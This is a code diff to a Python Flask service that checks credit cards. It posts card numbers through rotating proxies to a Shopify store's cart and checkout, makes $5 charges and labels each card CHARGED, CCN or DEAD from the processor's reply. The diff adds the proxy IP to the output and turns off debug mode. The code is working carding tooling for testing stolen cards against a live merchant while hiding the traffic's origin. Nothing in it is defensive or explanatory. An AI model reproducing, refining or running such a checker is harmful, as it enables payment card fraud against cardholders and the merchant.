@@ -41,7 +41,7 @@ def getHTTPProxy():
            # print(proxy)
             ok.append(proxy)
     ip=ok[0].split(":")[0]
-    return {"http"  : "http://"+ok[0]}, ip
+    return {"http": "http://"+ok[0]}, ip
 
 
 def multiexplode(string):
@@ -87,10 +87,7 @@ def handle_request():
         'x-requested-with': 'XMLHttpRequest'
     }
     data1 = r'form_type=product&utf8=%E2%9C%93&id=40236379799713&option-0=%245.00&quantity=1'
-    response1 = session.post("https://sapnap.shop/cart/add.js",
-                             headers=headers1,
-                             data=data1,
-                             proxies=proxy)
+    response1 = session.post("https://sapnap.shop/cart/add.js", headers=headers1, data=data1, proxies=proxy)
     headers2 = {
         'referer':
         'https://sapnap.shop/cart',
@@ -208,7 +205,8 @@ def handle_request():
         response = f'''CHARGED \n
          ➤ CC:  {lista}\n
          ➤ Response: $5 Charged \n
-         ➤ Gate : Shopify gateway '''.encode("utf-8")
+         ➤ Gate : Shopify gateway \n
+         IP {ip}'''.encode("utf-8")
     elif response8.text.__contains__(
         "Security code was not matched by the processor"
     ) or response8.text.__contains__(
@@ -217,14 +215,16 @@ def handle_request():
         response = f'''CCN \n
          ➤ CC:  {lista}\n
          ➤ Response: Card security code is incorrect\n
-         ➤ Gate : Shopify gateway '''.encode("utf-8")
+         ➤ Gate : Shopify gateway \n 
+         IP {ip}'''.encode("utf-8")
     else:
         soup = BeautifulSoup(response8.content, 'html.parser')
         error = soup.find('p', {'class': 'notice__text'}).text
         response = f'''DEAD \n
          ➤ CC:  {lista}\n
          ➤ Response: {error} \n
-         ➤ Gate : Shopify gateway '''.encode("utf-8")
+         ➤ Gate : Shopify gateway '\n 
+         {ip}'''.encode("utf-8")
 
     print(response)
     response = make_response(response)
@@ -232,4 +232,4 @@ def handle_request():
 
 
 if __name__ == "__main__":
-    app.run(host='0.0.0.0', debug=True)
+    app.run(host='0.0.0.0')
